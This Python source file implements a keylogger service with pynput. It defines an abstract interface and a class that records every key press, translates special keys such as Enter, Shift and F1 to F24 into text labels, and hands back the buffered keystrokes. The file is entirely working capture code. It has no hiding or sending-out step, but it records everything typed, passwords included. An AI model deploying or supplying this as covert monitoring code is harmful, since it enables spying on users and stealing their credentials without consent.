from pynput import keyboard
from abc import ABC, abstractmethod
from typing import List

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

class KeyLoggerService(IKeyLogger):
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: " ENTER ",
        keyboard.Key.esc: " ESC ",
        keyboard.Key.shift: " SHIFT ",
        keyboard.Key.shift_l: " SHIFT_L ",
        keyboard.Key.shift_r: " SHIFT_R ",
        keyboard.Key.ctrl: " CTRL ",
        keyboard.Key.ctrl_l: " CTRL_L ",
        keyboard.Key.alt: " ALT ",
        keyboard.Key.alt_l: " ALT_L ",
        keyboard.Key.alt_gr: " ALT_R ",
        keyboard.Key.caps_lock: " CAPS_LOCK ",
        keyboard.Key.tab: " TAB ",
        keyboard.Key.backspace: " BACKSPACE ",
        keyboard.Key.delete: " DELETE ",
        keyboard.Key.up: " UP ",
        keyboard.Key.down: " DOWN ",
        keyboard.Key.left: " LEFT ",
        keyboard.Key.right: " RIGHT ",
        keyboard.Key.cmd: " CMD ",
        keyboard.Key.home: " HOME ",
        keyboard.Key.end: " END ",
        keyboard.Key.page_up: " PAGE_UP ",
        keyboard.Key.page_down: " PAGE_DOWN ",
        keyboard.Key.insert: " INSERT ",
        keyboard.Key.print_screen: " PRINT_SCREEN ",
        keyboard.Key.num_lock: " NUM_LOCK ",
        keyboard.Key.scroll_lock: " SCROLL_LOCK ",
        keyboard.Key.f1: " F1 ",
        keyboard.Key.f2: " F2 ",
        keyboard.Key.f3: " F3 ",
        keyboard.Key.f4: " F4 ",
        keyboard.Key.f5: " F5 ",
        keyboard.Key.f6: " F6 ",
        keyboard.Key.f7: " F7 ",
        keyboard.Key.f8: " F8 ",
        keyboard.Key.f9: " F9 ",
        keyboard.Key.f10: " F10 ",
        keyboard.Key.f11: " F11 ",
        keyboard.Key.f12: " F12 ",
        keyboard.Key.f13: " F13 ",
        keyboard.Key.f14: " F14 ",
        keyboard.Key.f15: " F15 ",
        keyboard.Key.f16: " F16 ",
        keyboard.Key.f17: " F17 ",
        keyboard.Key.f18: " F18 ",
        keyboard.Key.f19: " F19 ",
        keyboard.Key.f20: " F20 ",
        keyboard.Key.f21: " F21 ",
        keyboard.Key.f22: " F22 ",
        keyboard.Key.f23: " F23 ",
        keyboard.Key.f24: " F24 ",
    }

    def __init__(self):
        self.char_list = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            self.char_list.append(key.char if key.char else "")
        except AttributeError:
            self.char_list.append(self.special_keys[key])

    def start_logging(self) -> None:
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        tmp_list = self.char_list.copy()
        self.char_list.clear()
        return tmp_list


